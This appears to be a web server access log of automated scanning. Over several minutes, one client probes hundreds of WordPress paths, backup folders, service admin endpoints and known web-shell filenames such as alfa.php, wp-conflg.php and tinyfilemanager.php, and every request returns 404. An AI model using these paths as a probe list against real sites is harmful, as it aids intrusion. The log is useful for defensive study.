adc3f2a20b2f7202242453b93960618d302b6732145c0ea5238ad391a6183a29;2025-11-28 18:32:54;/;/wp-content/backup-db/;GET;404
adc3f2a20b2f7202242453b93960618d302b6732145c0ea5238ad391a6183a29;2025-11-28 18:32:54;/;/wp-content/uploads/woocommerce_uploads/;GET;404
adc3f2a20b2f7202242453b93960618d302b6732145c0ea5238ad391a6183a29;2025-11-28 18:32:55;/;/wp-content/uploads/woocommerce/;GET;404
adc3f2a20b2f7202242453b93960618d302b6732145c0ea5238ad391a6183a29;2025-11-28 18:32:55;/;/wp-content/uploads/wc-logs/;GET;404
adc3f2a20b2f7202242453b93960618d302b6732145c0ea5238ad391a6183a29;2025-11-28 18:32:56;/;/wp-includes/images/;GET;404
adc3f2a20b2f7202242453b93960618d302b6732145c0ea5238ad391a6183a29;2025-11-28 18:32:56;/;/wp-includes/js/;GET;404
adc3f2a20b2f7202242453b93960618d302b6732145c0ea5238ad391a6183a29;2025-11-28 18:32:56;/;/wp-includes/fonts/;GET;404
adc3f2a20b2f7202242453b93960618d302b6732145c0ea5238ad391a6183a29;2025-11-28 18:32:56;/;/wp-includes/fonts/autoload_classmap.php;GET;404
adc3f2a20b2f7202242453b93960618d302b6732145c0ea5238ad391a6183a29;2025-11-28 18:32:57;/;/wp-includes/fonts/index.php;GET;404
adc3f2a20b2f7202242453b93960618d302b6732145c0ea5238ad391a6183a29;2025-11-28 18:32:57;/;/wp-includes/html-api/;GET;404
adc3f2a20b2f7202242453b93960618d302b6732145c0ea5238ad391a6183a29;2025-11-28 18:32:57;/;/wp-includes/images/crystal/;GET;404
adc3f2a20b2f7202242453b93960618d302b6732145c0ea5238ad391a6183a29;2025-11-28 18:32:58;/;/wp-includes/images/index.php;GET;404
adc3f2a20b2f7202242453b93960618d302b6732145c0ea5238ad391a6183a29;2025-11-28 18:32:58;/;/wp-includes/images/media/;GET;404
adc3f2a20b2f7202242453b93960618d302b6732145c0ea5238ad391a6183a29;2025-11-28 18:32:58;/;/wp-includes/images/media/index.php;GET;404
adc3f2a20b2f7202242453b93960618d302b6732145c0ea5238ad391a6183a29;2025-11-28 18:32:59;/;/wp-includes/images/smilies/;GET;404
adc3f2a20b2f7202242453b93960618d302b6732145c0ea5238ad391a6183a29;2025-11-28 18:32:59;/;/wp-includes/images/wlw/;GET;404
adc3f2a20b2f7202242453b93960618d302b6732145c0ea5238ad391a6183a29;2025-11-28 18:32:59;/;/wp-includes/index.php;GET;404
adc3f2a20b2f7202242453b93960618d302b6732145c0ea5238ad391a6183a29;2025-11-28 18:33:00;/;/wp-includes/js/codemirror/;GET;404
adc3f2a20b2f7202242453b93960618d302b6732145c0ea5238ad391a6183a29;2025-11-28 18:33:01;/;/wp-includes/js/crop/;GET;404
adc3f2a20b2f7202242453b93960618d302b6732145c0ea5238ad391a6183a29;2025-11-28 18:33:02;/;/wp-includes/js/jcrop/jcrop.php;GET;404
adc3f2a20b2f7202242453b93960618d302b6732145c0ea5238ad391a6183a29;2025-11-28 18:33:02;/;/wp-includes/php-compat/;GET;404
adc3f2a20b2f7202242453b93960618d302b6732145c0ea5238ad391a6183a29;2025-11-28 18:33:03;/;/wp-includes/pomo/;GET;404
adc3f2a20b2f7202242453b93960618d302b6732145c0ea5238ad391a6183a29;2025-11-28 18:33:03;/;/wp-includes/random_compat/;GET;404
adc3f2a20b2f7202242453b93960618d302b6732145c0ea5238ad391a6183a29;2025-11-28 18:33:03;/;/wp-includes/rest-api/;GET;404
adc3f2a20b2f7202242453b93960618d302b6732145c0ea5238ad391a6183a29;2025-11-28 18:33:04;/;/wp-includes/rest-api/endpoints/;GET;404
adc3f2a20b2f7202242453b93960618d302b6732145c0ea5238ad391a6183a29;2025-11-28 18:33:04;/;/wp-includes/rest-api/fields/;GET;404
adc3f2a20b2f7202242453b93960618d302b6732145c0ea5238ad391a6183a29;2025-11-28 18:33:04;/;/wp-includes/rest-api/search/;GET;404
adc3f2a20b2f7202242453b93960618d302b6732145c0ea5238ad391a6183a29;2025-11-28 18:33:05;/;/wp-includes/sitemaps/;GET;404
adc3f2a20b2f7202242453b93960618d302b6732145c0ea5238ad391a6183a29;2025-11-28 18:33:05;/;/wp-includes/sitemaps/autoload_classmap.php;GET;404
adc3f2a20b2f7202242453b93960618d302b6732145c0ea5238ad391a6183a29;2025-11-28 18:33:05;/;/wp-includes/sitemaps/providers/;GET;404
adc3f2a20b2f7202242453b93960618d302b6732145c0ea5238ad391a6183a29;2025-11-28 18:33:05;/;/wp-includes/sodium_compat/;GET;404
adc3f2a20b2f7202242453b93960618d302b6732145c0ea5238ad391a6183a29;2025-11-28 18:33:07;/;/wp-includes/sodium_compat/index.php;GET;404
adc3f2a20b2f7202242453b93960618d302b6732145c0ea5238ad391a6183a29;2025-11-28 18:33:07;/;/wp-includes/sodium_compat/src/;GET;404
adc3f2a20b2f7202242453b93960618d302b6732145c0ea5238ad391a6183a29;2025-11-28 18:33:08;/;/wp-includes/style-engine/index.php;GET;404
adc3f2a20b2f7202242453b93960618d302b6732145c0ea5238ad391a6183a29;2025-11-28 18:33:08;/;/wp-includes/style-engine/wp-conflg.php;GET;404
adc3f2a20b2f7202242453b93960618d302b6732145c0ea5238ad391a6183a29;2025-11-28 18:33:08;/;/wp-includes/theme-compat/;GET;404
adc3f2a20b2f7202242453b93960618d302b6732145c0ea5238ad391a6183a29;2025-11-28 18:33:09;/;/wp-includes/widgets/autoload_classmap.php;GET;404
adc3f2a20b2f7202242453b93960618d302b6732145c0ea5238ad391a6183a29;2025-11-28 18:33:09;/;/wp-mail.php;GET;404
adc3f2a20b2f7202242453b93960618d302b6732145c0ea5238ad391a6183a29;2025-11-28 18:33:10;/;/wp-signin.php;GET;404
adc3f2a20b2f7202242453b93960618d302b6732145c0ea5238ad391a6183a29;2025-11-28 18:33:10;/;/wp-update.php;GET;404
adc3f2a20b2f7202242453b93960618d302b6732145c0ea5238ad391a6183a29;2025-11-28 18:33:12;/;/wp.php;GET;404
adc3f2a20b2f7202242453b93960618d302b6732145c0ea5238ad391a6183a29;2025-11-28 18:33:14;/;/xmrlpc.php;GET;404
209e7cc361b40f907e5f0611e1e7c8864ce75ca7f55b32f74dcf2362ecfbe21a;2025-11-28 18:35:03;/query?q=SHOW+DIAGNOSTICS;/query?q=SHOW+DIAGNOSTICS;GET;404
8aadfd15f36ee157dadd29273dffb3f06fa3641e902dc79faf372cb08df91f59;2025-11-28 18:35:03;/solr/admin/info/system;/solr/admin/info/system;GET;404
6cdc106c112682af38ea5cce5934a1b0ae9d3246c57e3e81631eeace2bb1e956;2025-11-28 18:35:03;/v2/_catalog;/v2/_catalog;GET;404
8aadfd15f36ee157dadd29273dffb3f06fa3641e902dc79faf372cb08df91f59;2025-11-28 18:35:03;/solr/admin/cores?action=STATUS&wt=json;/solr/admin/cores?action=STATUS&wt=json;GET;404
adc3f2a20b2f7202242453b93960618d302b6732145c0ea5238ad391a6183a29;2025-11-28 18:35:12;/;/.well-known/;GET;404
adc3f2a20b2f7202242453b93960618d302b6732145c0ea5238ad391a6183a29;2025-11-28 18:35:14;/;/.well-known/index.php;GET;404
adc3f2a20b2f7202242453b93960618d302b6732145c0ea5238ad391a6183a29;2025-11-28 18:35:14;/;/1.php;GET;404
adc3f2a20b2f7202242453b93960618d302b6732145c0ea5238ad391a6183a29;2025-11-28 18:35:15;/;/403.php;GET;404
adc3f2a20b2f7202242453b93960618d302b6732145c0ea5238ad391a6183a29;2025-11-28 18:35:15;/;/aa.php;GET;404
adc3f2a20b2f7202242453b93960618d302b6732145c0ea5238ad391a6183a29;2025-11-28 18:35:15;/;/abcd.php;GET;404
adc3f2a20b2f7202242453b93960618d302b6732145c0ea5238ad391a6183a29;2025-11-28 18:35:15;/;/about.php;GET;404
adc3f2a20b2f7202242453b93960618d302b6732145c0ea5238ad391a6183a29;2025-11-28 18:35:16;/;/admin.php;GET;404
adc3f2a20b2f7202242453b93960618d302b6732145c0ea5238ad391a6183a29;2025-11-28 18:35:16;/;/admin/controller/extension/extension/;GET;404
adc3f2a20b2f7202242453b93960618d302b6732145c0ea5238ad391a6183a29;2025-11-28 18:35:16;/;/admin/function.php;GET;404
adc3f2a20b2f7202242453b93960618d302b6732145c0ea5238ad391a6183a29;2025-11-28 18:35:17;/;/akcc.php;GET;404
adc3f2a20b2f7202242453b93960618d302b6732145c0ea5238ad391a6183a29;2025-11-28 18:35:17;/;/alfa.php;GET;404
adc3f2a20b2f7202242453b93960618d302b6732145c0ea5238ad391a6183a29;2025-11-28 18:35:17;/;/api.php;GET;404
adc3f2a20b2f7202242453b93960618d302b6732145c0ea5238ad391a6183a29;2025-11-28 18:35:17;/;/as.php;GET;404
adc3f2a20b2f7202242453b93960618d302b6732145c0ea5238ad391a6183a29;2025-11-28 18:35:18;/;/asasx.php;GET;404
adc3f2a20b2f7202242453b93960618d302b6732145c0ea5238ad391a6183a29;2025-11-28 18:35:18;/;/asd.php;GET;404
adc3f2a20b2f7202242453b93960618d302b6732145c0ea5238ad391a6183a29;2025-11-28 18:35:19;/;/assets/;GET;404
adc3f2a20b2f7202242453b93960618d302b6732145c0ea5238ad391a6183a29;2025-11-28 18:35:21;/;/assets/images/;GET;404
adc3f2a20b2f7202242453b93960618d302b6732145c0ea5238ad391a6183a29;2025-11-28 18:35:23;/;/autoload_classmap/function.php;GET;404
adc3f2a20b2f7202242453b93960618d302b6732145c0ea5238ad391a6183a29;2025-11-28 18:35:23;/;/bolt.php;GET;404
adc3f2a20b2f7202242453b93960618d302b6732145c0ea5238ad391a6183a29;2025-11-28 18:35:24;/;/chosen.php;GET;404
adc3f2a20b2f7202242453b93960618d302b6732145c0ea5238ad391a6183a29;2025-11-28 18:35:24;/;/classwithtostring.php;GET;404
adc3f2a20b2f7202242453b93960618d302b6732145c0ea5238ad391a6183a29;2025-11-28 18:35:24;/;/dex.php;GET;404
adc3f2a20b2f7202242453b93960618d302b6732145c0ea5238ad391a6183a29;2025-11-28 18:35:25;/;/doc.php;GET;404
adc3f2a20b2f7202242453b93960618d302b6732145c0ea5238ad391a6183a29;2025-11-28 18:35:25;/;/ds.php;GET;404
adc3f2a20b2f7202242453b93960618d302b6732145c0ea5238ad391a6183a29;2025-11-28 18:35:26;/;/edit.php;GET;404
adc3f2a20b2f7202242453b93960618d302b6732145c0ea5238ad391a6183a29;2025-11-28 18:35:27;/;/file.php;GET;404
adc3f2a20b2f7202242453b93960618d302b6732145c0ea5238ad391a6183a29;2025-11-28 18:35:27;/;/files/;GET;404
adc3f2a20b2f7202242453b93960618d302b6732145c0ea5238ad391a6183a29;2025-11-28 18:35:27;/;/files/index.php;GET;404
adc3f2a20b2f7202242453b93960618d302b6732145c0ea5238ad391a6183a29;2025-11-28 18:35:28;/;/function.php;GET;404
adc3f2a20b2f7202242453b93960618d302b6732145c0ea5238ad391a6183a29;2025-11-28 18:35:28;/;/gelay.php;GET;404
adc3f2a20b2f7202242453b93960618d302b6732145c0ea5238ad391a6183a29;2025-11-28 18:35:28;/;/gfile.php;GET;404
adc3f2a20b2f7202242453b93960618d302b6732145c0ea5238ad391a6183a29;2025-11-28 18:35:29;/;/gg.php;GET;404
adc3f2a20b2f7202242453b93960618d302b6732145c0ea5238ad391a6183a29;2025-11-28 18:35:30;/;/goods.php;GET;404
adc3f2a20b2f7202242453b93960618d302b6732145c0ea5238ad391a6183a29;2025-11-28 18:35:30;/;/i.php;GET;404
adc3f2a20b2f7202242453b93960618d302b6732145c0ea5238ad391a6183a29;2025-11-28 18:35:31;/;/images/images/about.php;GET;404
adc3f2a20b2f7202242453b93960618d302b6732145c0ea5238ad391a6183a29;2025-11-28 18:35:31;/;/images/index.php;GET;404
adc3f2a20b2f7202242453b93960618d302b6732145c0ea5238ad391a6183a29;2025-11-28 18:35:31;/;/inc.php;GET;404
adc3f2a20b2f7202242453b93960618d302b6732145c0ea5238ad391a6183a29;2025-11-28 18:35:32;/;/index.bak.php;GET;404
adc3f2a20b2f7202242453b93960618d302b6732145c0ea5238ad391a6183a29;2025-11-28 18:35:34;/;/index/function.php;GET;404
adc3f2a20b2f7202242453b93960618d302b6732145c0ea5238ad391a6183a29;2025-11-28 18:35:35;/;/info.php;GET;404
adc3f2a20b2f7202242453b93960618d302b6732145c0ea5238ad391a6183a29;2025-11-28 18:35:36;/;/ini.php;GET;404
adc3f2a20b2f7202242453b93960618d302b6732145c0ea5238ad391a6183a29;2025-11-28 18:35:51;/;/inputs.php;GET;404
adc3f2a20b2f7202242453b93960618d302b6732145c0ea5238ad391a6183a29;2025-11-28 18:35:52;/;/ioxi-o.php;GET;404
adc3f2a20b2f7202242453b93960618d302b6732145c0ea5238ad391a6183a29;2025-11-28 18:35:52;/;/item.php;GET;404
adc3f2a20b2f7202242453b93960618d302b6732145c0ea5238ad391a6183a29;2025-11-28 18:35:52;/;/manager.php;GET;404
adc3f2a20b2f7202242453b93960618d302b6732145c0ea5238ad391a6183a29;2025-11-28 18:35:53;/;/modules/;GET;404
adc3f2a20b2f7202242453b93960618d302b6732145c0ea5238ad391a6183a29;2025-11-28 18:35:54;/;/moon.php;GET;404
adc3f2a20b2f7202242453b93960618d302b6732145c0ea5238ad391a6183a29;2025-11-28 18:35:55;/;/new.php;GET;404
adc3f2a20b2f7202242453b93960618d302b6732145c0ea5238ad391a6183a29;2025-11-28 18:35:56;/;/past.php;GET;404
adc3f2a20b2f7202242453b93960618d302b6732145c0ea5238ad391a6183a29;2025-11-28 18:35:57;/;/php/;GET;404
adc3f2a20b2f7202242453b93960618d302b6732145c0ea5238ad391a6183a29;2025-11-28 18:35:57;/;/radio.php;GET;404
adc3f2a20b2f7202242453b93960618d302b6732145c0ea5238ad391a6183a29;2025-11-28 18:35:58;/;/robots.php;GET;404
adc3f2a20b2f7202242453b93960618d302b6732145c0ea5238ad391a6183a29;2025-11-28 18:36:00;/;/shop.php;GET;404
adc3f2a20b2f7202242453b93960618d302b6732145c0ea5238ad391a6183a29;2025-11-28 18:36:01;/;/themes.php;GET;404
adc3f2a20b2f7202242453b93960618d302b6732145c0ea5238ad391a6183a29;2025-11-28 18:36:01;/;/tinyfilemanager.php;GET;404
adc3f2a20b2f7202242453b93960618d302b6732145c0ea5238ad391a6183a29;2025-11-28 18:36:02;/;/upload/;GET;404
adc3f2a20b2f7202242453b93960618d302b6732145c0ea5238ad391a6183a29;2025-11-28 18:36:04;/;/vendor/;GET;404
adc3f2a20b2f7202242453b93960618d302b6732145c0ea5238ad391a6183a29;2025-11-28 18:36:05;/;/wp-admin.php;GET;404
adc3f2a20b2f7202242453b93960618d302b6732145c0ea5238ad391a6183a29;2025-11-28 18:36:09;/;/wp-admin/;GET;404
adc3f2a20b2f7202242453b93960618d302b6732145c0ea5238ad391a6183a29;2025-11-28 18:36:11;/;/wp-admin/classwithtostring.php;GET;404
adc3f2a20b2f7202242453b93960618d302b6732145c0ea5238ad391a6183a29;2025-11-28 18:36:12;/;/wp-admin/css/;GET;404
adc3f2a20b2f7202242453b93960618d302b6732145c0ea5238ad391a6183a29;2025-11-28 18:36:15;/;/wp-admin/css/colors/;GET;404
adc3f2a20b2f7202242453b93960618d302b6732145c0ea5238ad391a6183a29;2025-11-28 18:36:16;/;/wp-admin/css/colors/ectoplasm/;GET;404
adc3f2a20b2f7202242453b93960618d302b6732145c0ea5238ad391a6183a29;2025-11-28 18:36:16;/;/wp-admin/css/colors/light/function.php;GET;404
adc3f2a20b2f7202242453b93960618d302b6732145c0ea5238ad391a6183a29;2025-11-28 18:36:19;/;/wp-admin/css/colors/midnight/;GET;404
adc3f2a20b2f7202242453b93960618d302b6732145c0ea5238ad391a6183a29;2025-11-28 18:36:19;/;/wp-admin/images/;GET;404
adc3f2a20b2f7202242453b93960618d302b6732145c0ea5238ad391a6183a29;2025-11-28 18:36:20;/;/wp-admin/includes/;GET;404
adc3f2a20b2f7202242453b93960618d302b6732145c0ea5238ad391a6183a29;2025-11-28 18:36:22;/;/wp-admin/includes/about.php;GET;404
adc3f2a20b2f7202242453b93960618d302b6732145c0ea5238ad391a6183a29;2025-11-28 18:36:24;/;/wp-admin/includes/colour.php;GET;404
adc3f2a20b2f7202242453b93960618d302b6732145c0ea5238ad391a6183a29;2025-11-28 18:36:25;/;/wp-admin/includes/index.php;GET;404
adc3f2a20b2f7202242453b93960618d302b6732145c0ea5238ad391a6183a29;2025-11-28 18:36:26;/;/wp-admin/js/;GET;404
adc3f2a20b2f7202242453b93960618d302b6732145c0ea5238ad391a6183a29;2025-11-28 18:36:27;/;/wp-admin/js/widgets/;GET;404
adc3f2a20b2f7202242453b93960618d302b6732145c0ea5238ad391a6183a29;2025-11-28 18:36:28;/;/wp-admin/js/widgets/index.php;GET;404
adc3f2a20b2f7202242453b93960618d302b6732145c0ea5238ad391a6183a29;2025-11-28 18:36:28;/;/wp-admin/mah.php;GET;404
adc3f2a20b2f7202242453b93960618d302b6732145c0ea5238ad391a6183a29;2025-11-28 18:36:29;/;/wp-admin/maint/;GET;404
adc3f2a20b2f7202242453b93960618d302b6732145c0ea5238ad391a6183a29;2025-11-28 18:36:29;/;/wp-admin/meta/;GET;404
adc3f2a20b2f7202242453b93960618d302b6732145c0ea5238ad391a6183a29;2025-11-28 18:36:31;/;/wp-admin/network/;GET;404
adc3f2a20b2f7202242453b93960618d302b6732145c0ea5238ad391a6183a29;2025-11-28 18:36:32;/;/wp-admin/wp-admins.php;GET;404
adc3f2a20b2f7202242453b93960618d302b6732145c0ea5238ad391a6183a29;2025-11-28 18:36:32;/;/wp-blog-header.php;GET;404
adc3f2a20b2f7202242453b93960618d302b6732145c0ea5238ad391a6183a29;2025-11-28 18:36:33;/;/wp-comments.php;GET;404
adc3f2a20b2f7202242453b93960618d302b6732145c0ea5238ad391a6183a29;2025-11-28 18:36:33;/;/wp-conflg.php;GET;404
adc3f2a20b2f7202242453b93960618d302b6732145c0ea5238ad391a6183a29;2025-11-28 18:36:33;/;/wp-content/;GET;404
adc3f2a20b2f7202242453b93960618d302b6732145c0ea5238ad391a6183a29;2025-11-28 18:36:34;/;/wp-content/1.php;GET;404
adc3f2a20b2f7202242453b93960618d302b6732145c0ea5238ad391a6183a29;2025-11-28 18:36:35;/;/wp-content/Geforce.php;GET;404
adc3f2a20b2f7202242453b93960618d302b6732145c0ea5238ad391a6183a29;2025-11-28 18:36:35;/;/wp-content/admin.php;GET;404
adc3f2a20b2f7202242453b93960618d302b6732145c0ea5238ad391a6183a29;2025-11-28 18:36:36;/;/wp-content/autoload_classmap.php;GET;404
adc3f2a20b2f7202242453b93960618d302b6732145c0ea5238ad391a6183a29;2025-11-28 18:36:37;/;/wp-content/index.php;GET;404
adc3f2a20b2f7202242453b93960618d302b6732145c0ea5238ad391a6183a29;2025-11-28 18:36:37;/;/wp-content/plugins/;GET;404
adc3f2a20b2f7202242453b93960618d302b6732145c0ea5238ad391a6183a29;2025-11-28 18:36:38;/;/wp-content/plugins/HelloDollyV2/;GET;404
adc3f2a20b2f7202242453b93960618d302b6732145c0ea5238ad391a6183a29;2025-11-28 18:36:39;/;/wp-content/plugins/admin.php;GET;404
adc3f2a20b2f7202242453b93960618d302b6732145c0ea5238ad391a6183a29;2025-11-28 18:36:39;/;/wp-content/plugins/dummyyummy/wp-signup.php;GET;404
adc3f2a20b2f7202242453b93960618d302b6732145c0ea5238ad391a6183a29;2025-11-28 18:36:40;/;/wp-content/plugins/pwnd/as.php;GET;404
adc3f2a20b2f7202242453b93960618d302b6732145c0ea5238ad391a6183a29;2025-11-28 18:36:40;/;/wp-content/themes/;GET;404
adc3f2a20b2f7202242453b93960618d302b6732145c0ea5238ad391a6183a29;2025-11-28 18:36:40;/;/wp-content/themes/admin.php;GET;404
adc3f2a20b2f7202242453b93960618d302b6732145c0ea5238ad391a6183a29;2025-11-28 18:36:41;/;/wp-content/themes/index.php;GET;404
adc3f2a20b2f7202242453b93960618d302b6732145c0ea5238ad391a6183a29;2025-11-28 18:36:41;/;/wp-content/themes/themes.php;GET;404
adc3f2a20b2f7202242453b93960618d302b6732145c0ea5238ad391a6183a29;2025-11-28 18:36:42;/;/wp-content/upgrade/;GET;404
adc3f2a20b2f7202242453b93960618d302b6732145c0ea5238ad391a6183a29;2025-11-28 18:36:42;/;/wp-content/upgrade/index.php;GET;404
adc3f2a20b2f7202242453b93960618d302b6732145c0ea5238ad391a6183a29;2025-11-28 18:36:43;/;/wp-content/uploads/;GET;404
adc3f2a20b2f7202242453b93960618d302b6732145c0ea5238ad391a6183a29;2025-11-28 18:36:43;/;/wp-content/uploads/Geforce.php;GET;404
adc3f2a20b2f7202242453b93960618d302b6732145c0ea5238ad391a6183a29;2025-11-28 18:36:43;/;/wp-content/uploads/index.php;GET;404
adc3f2a20b2f7202242453b93960618d302b6732145c0ea5238ad391a6183a29;2025-11-28 18:36:44;/;/wp-good.php;GET;404
adc3f2a20b2f7202242453b93960618d302b6732145c0ea5238ad391a6183a29;2025-11-28 18:36:45;/;/wp-includes/;GET;404
adc3f2a20b2f7202242453b93960618d302b6732145c0ea5238ad391a6183a29;2025-11-28 18:36:45;/;/wp-includes/ID3/;GET;404
adc3f2a20b2f7202242453b93960618d302b6732145c0ea5238ad391a6183a29;2025-11-28 18:36:46;/;/wp-includes/ID3/index.php;GET;404
adc3f2a20b2f7202242453b93960618d302b6732145c0ea5238ad391a6183a29;2025-11-28 18:36:46;/;/wp-includes/IXR/;GET;404
adc3f2a20b2f7202242453b93960618d302b6732145c0ea5238ad391a6183a29;2025-11-28 18:36:47;/;/wp-includes/IXR/test1.php;GET;404
adc3f2a20b2f7202242453b93960618d302b6732145c0ea5238ad391a6183a29;2025-11-28 18:36:47;/;/wp-includes/PHPMailer/;GET;404
adc3f2a20b2f7202242453b93960618d302b6732145c0ea5238ad391a6183a29;2025-11-28 18:36:48;/;/wp-includes/Requests/;GET;404
adc3f2a20b2f7202242453b93960618d302b6732145c0ea5238ad391a6183a29;2025-11-28 18:36:48;/;/wp-includes/Requests/Auth/;GET;404
adc3f2a20b2f7202242453b93960618d302b6732145c0ea5238ad391a6183a29;2025-11-28 18:36:48;/;/wp-includes/Requests/index.php;GET;404
adc3f2a20b2f7202242453b93960618d302b6732145c0ea5238ad391a6183a29;2025-11-28 18:36:49;/;/wp-includes/SimplePie/;GET;404
adc3f2a20b2f7202242453b93960618d302b6732145c0ea5238ad391a6183a29;2025-11-28 18:36:49;/;/wp-includes/SimplePie/Content/;GET;404
adc3f2a20b2f7202242453b93960618d302b6732145c0ea5238ad391a6183a29;2025-11-28 18:36:51;/;/wp-includes/SimplePie/autoload_classmap.php;GET;404
adc3f2a20b2f7202242453b93960618d302b6732145c0ea5238ad391a6183a29;2025-11-28 18:36:52;/;/wp-includes/SimplePie/chosen.php;GET;404
adc3f2a20b2f7202242453b93960618d302b6732145c0ea5238ad391a6183a29;2025-11-28 18:36:53;/;/wp-includes/SimplePie/index.php;GET;404
adc3f2a20b2f7202242453b93960618d302b6732145c0ea5238ad391a6183a29;2025-11-28 18:36:54;/;/wp-includes/Text/;GET;404
adc3f2a20b2f7202242453b93960618d302b6732145c0ea5238ad391a6183a29;2025-11-28 18:36:55;/;/wp-includes/Text/Diff/;GET;404
adc3f2a20b2f7202242453b93960618d302b6732145c0ea5238ad391a6183a29;2025-11-28 18:36:55;/;/wp-includes/Text/Diff/Engine/;GET;404
adc3f2a20b2f7202242453b93960618d302b6732145c0ea5238ad391a6183a29;2025-11-28 18:36:56;/;/wp-includes/Text/Diff/Renderer/;GET;404
adc3f2a20b2f7202242453b93960618d302b6732145c0ea5238ad391a6183a29;2025-11-28 18:36:57;/;/wp-includes/Text/Diff/index.php;GET;404
adc3f2a20b2f7202242453b93960618d302b6732145c0ea5238ad391a6183a29;2025-11-28 18:36:57;/;/wp-includes/Text/wp-conflg.php;GET;404
adc3f2a20b2f7202242453b93960618d302b6732145c0ea5238ad391a6183a29;2025-11-28 18:36:58;/;/wp-includes/assets/;GET;404
adc3f2a20b2f7202242453b93960618d302b6732145c0ea5238ad391a6183a29;2025-11-28 18:36:59;/;/wp-includes/assets/autoload_classmap.php;GET;404
adc3f2a20b2f7202242453b93960618d302b6732145c0ea5238ad391a6183a29;2025-11-28 18:36:59;/;/wp-includes/bk/index.php;GET;404
adc3f2a20b2f7202242453b93960618d302b6732145c0ea5238ad391a6183a29;2025-11-28 18:36:59;/;/wp-includes/block-bindings/;GET;404
adc3f2a20b2f7202242453b93960618d302b6732145c0ea5238ad391a6183a29;2025-11-28 18:37:00;/;/wp-includes/block-patterns/;GET;404
adc3f2a20b2f7202242453b93960618d302b6732145c0ea5238ad391a6183a29;2025-11-28 18:37:01;/;/wp-includes/block-supports/;GET;404
adc3f2a20b2f7202242453b93960618d302b6732145c0ea5238ad391a6183a29;2025-11-28 18:37:02;/;/wp-includes/blocks/shortcode/index.php;GET;404
adc3f2a20b2f7202242453b93960618d302b6732145c0ea5238ad391a6183a29;2025-11-28 18:37:03;/;/wp-includes/certificates/;GET;404
adc3f2a20b2f7202242453b93960618d302b6732145c0ea5238ad391a6183a29;2025-11-28 18:37:04;/;/wp-includes/css/;GET;404
adc3f2a20b2f7202242453b93960618d302b6732145c0ea5238ad391a6183a29;2025-11-28 18:37:04;/;/wp-includes/css/dist/alam.php;GET;404
adc3f2a20b2f7202242453b93960618d302b6732145c0ea5238ad391a6183a29;2025-11-28 18:37:05;/;/wp-includes/customize/;GET;404
adc3f2a20b2f7202242453b93960618d302b6732145c0ea5238ad391a6183a29;2025-11-28 18:37:06;/;/wp-includes/customize/index.php;GET;404
adc3f2a20b2f7202242453b93960618d302b6732145c0ea5238ad391a6183a29;2025-11-28 18:37:07;/;/wp-content/cache/;GET;404
adc3f2a20b2f7202242453b93960618d302b6732145c0ea5238ad391a6183a29;2025-11-28 18:37:09;/;/wp-content/w3tc/;GET;404
adc3f2a20b2f7202242453b93960618d302b6732145c0ea5238ad391a6183a29;2025-11-28 18:37:10;/;/wp-content/et-cache/;GET;404
adc3f2a20b2f7202242453b93960618d302b6732145c0ea5238ad391a6183a29;2025-11-28 18:37:10;/;/wp-content/cache/supercache/;GET;404
adc3f2a20b2f7202242453b93960618d302b6732145c0ea5238ad391a6183a29;2025-11-28 18:37:10;/;/wp-content/wflogs/;GET;404
adc3f2a20b2f7202242453b93960618d302b6732145c0ea5238ad391a6183a29;2025-11-28 18:37:11;/;/wp-content/updraft/;GET;404
adc3f2a20b2f7202242453b93960618d302b6732145c0ea5238ad391a6183a29;2025-11-28 18:37:11;/;/wp-content/ai1wm-backups/;GET;404
adc3f2a20b2f7202242453b93960618d302b6732145c0ea5238ad391a6183a29;2025-11-28 18:37:11;/;/wp-content/backups-dup-lite/;GET;404
adc3f2a20b2f7202242453b93960618d302b6732145c0ea5238ad391a6183a29;2025-11-28 18:37:11;/;/wp-content/backup-db/;GET;404
adc3f2a20b2f7202242453b93960618d302b6732145c0ea5238ad391a6183a29;2025-11-28 18:37:12;/;/wp-content/uploads/woocommerce_uploads/;GET;404
adc3f2a20b2f7202242453b93960618d302b6732145c0ea5238ad391a6183a29;2025-11-28 18:37:14;/;/wp-content/uploads/woocommerce/;GET;404
adc3f2a20b2f7202242453b93960618d302b6732145c0ea5238ad391a6183a29;2025-11-28 18:37:14;/;/wp-content/uploads/wc-logs/;GET;404
adc3f2a20b2f7202242453b93960618d302b6732145c0ea5238ad391a6183a29;2025-11-28 18:37:15;/;/wp-includes/images/;GET;404
adc3f2a20b2f7202242453b93960618d302b6732145c0ea5238ad391a6183a29;2025-11-28 18:37:16;/;/wp-includes/js/;GET;404
adc3f2a20b2f7202242453b93960618d302b6732145c0ea5238ad391a6183a29;2025-11-28 18:37:18;/;/wp-includes/fonts/;GET;404
adc3f2a20b2f7202242453b93960618d302b6732145c0ea5238ad391a6183a29;2025-11-28 18:37:18;/;/wp-includes/fonts/autoload_classmap.php;GET;404
adc3f2a20b2f7202242453b93960618d302b6732145c0ea5238ad391a6183a29;2025-11-28 18:37:19;/;/wp-includes/fonts/index.php;GET;404
adc3f2a20b2f7202242453b93960618d302b6732145c0ea5238ad391a6183a29;2025-11-28 18:37:20;/;/wp-includes/html-api/;GET;404
adc3f2a20b2f7202242453b93960618d302b6732145c0ea5238ad391a6183a29;2025-11-28 18:37:20;/;/wp-includes/images/crystal/;GET;404
adc3f2a20b2f7202242453b93960618d302b6732145c0ea5238ad391a6183a29;2025-11-28 18:37:21;/;/wp-includes/images/index.php;GET;404
adc3f2a20b2f7202242453b93960618d302b6732145c0ea5238ad391a6183a29;2025-11-28 18:37:21;/;/wp-includes/images/media/;GET;404
adc3f2a20b2f7202242453b93960618d302b6732145c0ea5238ad391a6183a29;2025-11-28 18:37:22;/;/wp-includes/images/media/index.php;GET;404
adc3f2a20b2f7202242453b93960618d302b6732145c0ea5238ad391a6183a29;2025-11-28 18:37:23;/;/wp-includes/images/smilies/;GET;404
adc3f2a20b2f7202242453b93960618d302b6732145c0ea5238ad391a6183a29;2025-11-28 18:37:23;/;/wp-includes/images/wlw/;GET;404
adc3f2a20b2f7202242453b93960618d302b6732145c0ea5238ad391a6183a29;2025-11-28 18:37:24;/;/wp-includes/index.php;GET;404
adc3f2a20b2f7202242453b93960618d302b6732145c0ea5238ad391a6183a29;2025-11-28 18:37:25;/;/wp-includes/js/codemirror/;GET;404
adc3f2a20b2f7202242453b93960618d302b6732145c0ea5238ad391a6183a29;2025-11-28 18:37:25;/;/wp-includes/js/crop/;GET;404
adc3f2a20b2f7202242453b93960618d302b6732145c0ea5238ad391a6183a29;2025-11-28 18:37:26;/;/wp-includes/js/jcrop/jcrop.php;GET;404
adc3f2a20b2f7202242453b93960618d302b6732145c0ea5238ad391a6183a29;2025-11-28 18:37:26;/;/wp-includes/php-compat/;GET;404
